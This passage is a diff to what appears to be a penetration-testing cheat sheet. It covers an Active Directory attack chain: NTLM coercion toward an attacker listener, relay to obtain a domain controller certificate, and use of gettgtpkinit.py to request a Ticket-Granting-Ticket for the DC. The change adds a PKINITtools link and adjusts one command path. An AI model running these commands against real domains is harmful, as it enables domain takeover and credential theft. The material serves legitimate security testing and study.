@@ -44,8 +44,9 @@ nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> M=pe
 
 You should receive a base64 encoded certificate in ntlmrelayx output
 Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.
+[https://github.com/dirkjanm/PKINITtools.git](https://github.com/dirkjanm/PKINITtools.git)
 ```PowerShell
-python3 /opt/PKINITtools/gettgtpkinit.py DOMAIN.LOCAL/DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
+python3 gettgtpkinit.py DOMAIN.LOCAL/DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
 ```
 Set krb env variable
 ```PowerShell
